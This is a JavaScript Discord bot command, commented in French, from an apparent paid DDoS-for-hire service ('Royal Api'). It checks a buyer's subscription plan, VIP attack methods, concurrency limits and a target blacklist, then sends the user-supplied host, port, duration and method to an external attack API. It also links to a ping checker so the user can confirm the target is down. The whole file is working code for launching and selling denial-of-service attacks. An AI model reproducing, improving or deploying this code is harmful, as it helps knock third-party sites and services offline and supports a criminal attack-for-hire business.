const { MessageEmbed } = require('discord.js');
const fetch = require('node-fetch');
const config = require('../config.json');
const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('./database/buyers.db');
const blacklist = require('../bl.json').blacklisted_targets;
const sanctionsDB = new sqlite3.Database('./database/sanctions.db');
const activeAttacks = {};

module.exports = {
    name: 'send',
    description: 'Envoyer une attaque via Royal Api',
    async execute(message, args) {
        message.delete({ timeout: 3000 }).catch(console.error);

        const sendMessage = async (target, content) => {
            try {
                await target.send(content);
            } catch (error) {
                if (error.code === 50007) {
                    await message.author.send(`${message.author}, je ne peux pas t'envoyer de messages privés. Assure-toi que tes MP sont ouverts!`);
                } else {
                    console.error("Erreur lors de l'envoi d'un message privé:", error);
                }
            }
        };

        if (!config.WL_CHANNELS.includes(message.channel.id)) {
            await sendMessage(message.author, "❌ Vous ne pouvez pas utiliser cette commande dans ce canal.");
            return;
        }
        
        sanctionsDB.get("SELECT * FROM sanctions WHERE user_id = ? AND end_time > datetime('now')", [message.author.id], async (err, row) => {
            if (err) {
                console.error(err.message);
                await sendMessage(message.author, "❌ Une erreur est survenue lors de la vérification de l'utilisateur.");
                return;
            }
            if (row) {
                const remainingTime = new Date(row.end_time) - new Date();
                const remainingHours = Math.floor(remainingTime / (1000 * 60 * 60));
                const remainingMinutes = Math.ceil((remainingTime % (1000 * 60 * 60)) / (1000 * 60));
                const remainingTimeString = `${remainingHours} heure(s) et ${remainingMinutes} minute(s)`;
                await sendMessage(message.author, `❌ Vous êtes actuellement verrouillé et ne pouvez pas utiliser cette commande. Il reste ${remainingTimeString} avant la levée du verrouillage.`);
                return;
            }
            
            const [host, port, time, method] = args;
            if (!host || !port || !time || !method) {
                await sendMessage(message.author, "❌ Usage incorrect de la commande. Format attendu : `.send <host> <port> <time> <method>`");
                return;
            }

            if (!(port >= 1 && port <= 65535)) {
                await sendMessage(message.author, "❌ Erreur : le port doit être compris entre 1 et 65535.");
                return;
            }

            const isBlacklisted = blacklist.some(blacklistedItem => host.includes(blacklistedItem));
            if (isBlacklisted) {
                await sendMessage(message.author, "🚨La cible spécifiée est sur la Blacklist et ne peut pas être Frappée, Un admin sera tenu au courant de ton essai !! 🚨");
                
                const blacklistWebhookData = {
                    username: "Blacklist Alert",
                    embeds: [{
                        title: "Tentative d'attaque sur cible blacklistée",
                        description: `🚨 Une tentative d'attaque a été détectée sur une cible blacklistée.`,
                        color: 0xFF0000,
                        fields: [
                            { name: "Utilisateur", value: message.author.tag, inline: true },
                            { name: "Cible", value: host, inline: true }
                        ],
                        timestamp: new Date()
                    }]
                };

                fetch(config.WEBHOOK_BL_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(blacklistWebhookData)
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('HTTP status ' + response.status);
                    }
                })
                .catch(err => {
                    console.error("Error sending message to blacklist webhook:", err);
                    sendMessage(message.author, "❌ Échec de l'envoi du message au webhook. Erreur : " + err.message);
                });
                return;
            }

            db.get(`SELECT max_time, concurrents, vip, plan_end_time FROM buyers WHERE user_id = ?`, [message.author.id], async (err, row) => {
                if (err) {
                    await sendMessage(message.author, "❌ Une erreur est survenue lors de la vérification de l'utilisateur.");
                    console.error(err.message);
                    return;
                }
                if (!row) {
                    await sendMessage(message.author, "❌ Vous n'êtes pas autorisé à utiliser cette commande ou vous n'êtes pas enregistré.");
                    return;
                }

                const { max_time, concurrents, vip, plan_end_time } = row;
                const currentTime = new Date();
                const endTime = new Date(plan_end_time);

                if (currentTime >= endTime) {
                    await sendMessage(message.author, "❌ Votre plan a expiré. Veuillez renouveler pour continuer à utiliser le service.");
                    return;
                }

                if (parseInt(time) > max_time) {
                    await sendMessage(message.author, `❌ Erreur : Le temps doit être inférieur ou égal à votre temps maximum de ${max_time} secondes.`);
                    return;
                }

                const allowedMethods = vip ? [...config.METHODS_NOVIP, ...config.VIP_METHODS] : config.METHODS_NOVIP;
                if (!allowedMethods.includes(method)) {
                    await sendMessage(message.author, `❌Vous n'avez pas le vip et ou Veuillez verifier la commande utilisée ( EN MINUSCULE ): ${allowedMethods.join(', ')}`);
                    return;
                }

                if (!activeAttacks[message.author.id]) {
                    activeAttacks[message.author.id] = [];
                }
                activeAttacks[message.author.id] = activeAttacks[message.author.id].filter(attack => (new Date() - attack.startTime) / 1000 < attack.duration);

                if (activeAttacks[message.author.id].length >= concurrents) {
                    const nextAvailableTime = Math.min(...activeAttacks[message.author.id].map(attack => attack.startTime.getTime() + attack.duration * 1000)) - Date.now();
                    await sendMessage(message.author, `❌ Vous avez déjà une attaque en cours. Il reste ${Math.ceil(nextAvailableTime / 1000)} secondes avant que vous puissiez en lancer une nouvelle.`);
                    return;
                }

                const isVipMethod = config.VIP_METHODS.includes(method);
                const webhookUrl = (vip && isVipMethod) ? config.WEBHOOK_VIP_URL : config.WEBHOOK_URL;
                const webhookData = {
                    username: "🛡️ Royal Api Logs Envoyée 🛡️",
                    embeds: [{
                        title: "Nouvelle attaque",
                        description: `Une attaque a bien été lancée par ${message.author.username}`,
                        fields: [
                            { name: "🎯 Target", value: host, inline: true },
                            { name: "🔌 Port", value: port.toString(), inline: true },
                            { name: "⏳ Duration", value: `${time} seconds`, inline: true },
                            { name: "🔨 Method", value: method, inline: true }
                        ],
                        color: vip ? 0xFFD700 : 0x00A2E8
                    }]
                };

                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(webhookData)
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('HTTP status ' + response.status);
                    }
                })
                .catch(err => {
                    console.error("Error sending message to webhook:", err);
                    sendMessage(message.author, "❌ Failed to send message to webhook. Error: " + err.message);
                });

                const apiUrl = `${config.API_URL}?username=${config.API_USERNAME}&password=${config.API_KEY}&host=${host}&port=${port}&time=${time}&method=${method}`;
                fetch(apiUrl)
                .then(res => res.json())
                .then(async data => {
                    if (!data.error) {
                        const embed = new MessageEmbed()
                            .setTitle("🛡️ ATTAQUE ENVOYÉE")
                            .setDescription("Vérification et détails de l'attaque.")
                            .setColor("#1D82B6")
                            .addField("🎯 CIBLE", host, true)
                            .addField("🔌 PORT", port.toString(), true)
                            .addField("⏳ DURÉE", `${time.toString()} secondes`, true)
                            .addField("🔨 MÉTHODE", method, true)
                            .addField("🔍 VÉRIFIER L'ÉTAT DE LA CIBLE", `[Check Host](https://check-host.net/check-ping?host=${host})`)
                            .setThumbnail("https://media.discordapp.net/attachments/1222634820207644795/1236588453047832608/evil-yes.gif?ex=665b7dfd&is=665");

                        await sendMessage(message.author, { embeds: [embed] });
                    } else {
                        await sendMessage(message.author, `❌ Erreur lors de l'exécution de l'attaque : ${data.message}`);
                    }
                })
                .catch(async err => {
                    console.error(err);
                    await sendMessage(message.author, "❌ Erreur lors de la connexion à l'API.");
                });
            });
        });
    },
};
